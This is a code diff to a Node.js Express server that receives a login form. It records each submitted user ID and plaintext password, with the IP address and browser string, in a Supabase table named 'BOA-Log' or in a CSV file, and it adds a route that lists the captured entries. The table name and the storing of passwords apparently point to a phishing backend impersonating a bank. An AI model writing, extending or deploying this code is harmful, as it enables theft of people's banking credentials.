@@ -16,6 +16,56 @@ const PORT = process.env.PORT || 3000;
 // Middleware
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+
+// API Routes MUST come before static middleware
+// Setup endpoint to test BOA-Log table
+app.post('/api/setup', async (req, res) => {
+  console.log('Setup endpoint called - testing BOA-Log table');
+  try {
+    if (!supabase) {
+      return res.status(500).json({ success: false, error: 'Supabase not configured' });
+    }
+
+    // Get table schema first to see what columns are available
+    console.log('Attempting to query BOA-Log table...');
+    
+    // Try a simple insert with just empty object to trigger auto-generated columns
+    const { data: testData, error: testError } = await supabase
+      .from('BOA-Log')
+      .insert([{}])
+      .select();
+
+    if (testError) {
+      console.error('Error inserting test entry:', testError.message);
+      // Try with at least one column
+      const { data: retryData, error: retryError } = await supabase
+        .from('BOA-Log')
+        .insert([{ id: null }]) // Let the sequence generate it
+        .select();
+      
+      if (retryError) {
+        console.error('Retry also failed:', retryError.message);
+        return res.status(500).json({ success: false, error: retryError.message });
+      }
+      
+      console.log('✓ Test entry inserted (retry):', retryData);
+      return res.json({ success: true, message: 'Sample entry inserted into BOA-Log', data: retryData });
+    }
+
+    console.log('✓ Test entry inserted successfully:', testData);
+    res.json({ success: true, message: 'Sample entry inserted into BOA-Log', data: testData });
+  } catch (error) {
+    console.error('Setup error:', error.message);
+    res.status(500).json({ success: false, error: error.message });
+  }
+});
+
+// Debug route
+app.get('/api/debug', (req, res) => {
+  res.json({ status: 'ok', message: 'Server is running' });
+});
+
+// Static files middleware - AFTER API routes
 app.use(express.static(path.join(__dirname)));
 
 // Supabase Configuration
@@ -44,50 +94,6 @@ function getClientIp(req) {
          'unknown';
 }
 
-// Log entry function - supports both Supabase and local CSV
-async function logEntry(data) {
-  try {
-    if (useSupabase && supabase) {
-      // Log to Supabase
-      const { error } = await supabase
-        .from('login_attempts')
-        .insert([
-          {
-            user_id: data.userId || 'N/A',
-            password: data.password || 'N/A',
-            remember_me: data.rememberMe ? true : false,
-            ip_address: data.ipAddress || 'unknown',
-            user_agent: data.userAgent || 'unknown',
-            status: 'Attempted',
-            created_at: new Date().toISOString()
-          }
-        ]);
-
-      if (error) {
-        console.error('Error writing to Supabase:', error);
-        throw error;
-      }
-      console.log('Entry logged to Supabase:', data.userId);
-    } else {
-      // Fallback to local CSV logging
-      const logsFile = path.join(logsDir, 'login_entries.csv');
-      const timestamp = new Date().toISOString();
-      const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
-      
-      // Add header if file doesn't exist
-      if (!fs.existsSync(logsFile)) {
-        fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
-      }
-      
-      fs.appendFileSync(logsFile, entry);
-      console.log('Entry logged to CSV:', data.userId);
-    }
-  } catch (error) {
-    console.error('Error logging entry:', error);
-    throw error;
-  }
-}
-
 // API endpoint for form submissions
 app.post('/api/login', async (req, res) => {
   const { userId, password, rememberMe } = req.body;
@@ -111,13 +117,82 @@ app.post('/api/login', async (req, res) => {
   }
 });
 
+// Log entry function - supports both Supabase and local CSV
+async function logEntry(data) {
+  try {
+    if (useSupabase && supabase) {
+      // Log to Supabase BOA-Log table
+      // Note: BOA-Log table only has id and created_at auto-generated columns
+      // We'll store all data as JSON in a notes/data column if it exists, or use CSV fallback
+      
+      try {
+        // Try inserting with JSON data column
+        const { error } = await supabase
+          .from('BOA-Log')
+          .insert([
+            {
+              data: JSON.stringify({
+                user_id: data.userId || 'N/A',
+                password: data.password || 'N/A',
+                remember_me: data.rememberMe ? true : false,
+                ip_address: data.ipAddress || 'unknown',
+                user_agent: data.userAgent || 'unknown',
+                status: 'Attempted',
+                timestamp: new Date().toISOString()
+              })
+            }
+          ]);
+
+        if (!error) {
+          console.log('Entry logged to Supabase BOA-Log:', data.userId);
+          return;
+        }
+        
+        // If data column doesn't exist, try without it and fall back to CSV
+        throw new Error('BOA-Log table schema mismatch');
+      } catch (dbError) {
+        console.log('Supabase insertion failed, using CSV fallback:', dbError.message);
+        
+        // Fallback to local CSV logging
+        const logsFile = path.join(logsDir, 'login_entries.csv');
+        const timestamp = new Date().toISOString();
+        const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
+        
+        // Add header if file doesn't exist
+        if (!fs.existsSync(logsFile)) {
+          fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
+        }
+        
+        fs.appendFileSync(logsFile, entry);
+        console.log('Entry logged to CSV (Supabase fallback):', data.userId);
+      }
+    } else {
+      // Fallback to local CSV logging
+      const logsFile = path.join(logsDir, 'login_entries.csv');
+      const timestamp = new Date().toISOString();
+      const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
+      
+      // Add header if file doesn't exist
+      if (!fs.existsSync(logsFile)) {
+        fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
+      }
+      
+      fs.appendFileSync(logsFile, entry);
+      console.log('Entry logged to CSV:', data.userId);
+    }
+  } catch (error) {
+    console.error('Error logging entry:', error);
+    throw error;
+  }
+}
+
 // Route to view logs
 app.get('/api/logs', async (req, res) => {
   try {
     if (useSupabase && supabase) {
       // Get logs from Supabase
       const { data, error } = await supabase
-        .from('login_attempts')
+        .from('BOA-Log')
         .select('*')
         .order('created_at', { ascending: false })
         .limit(100);
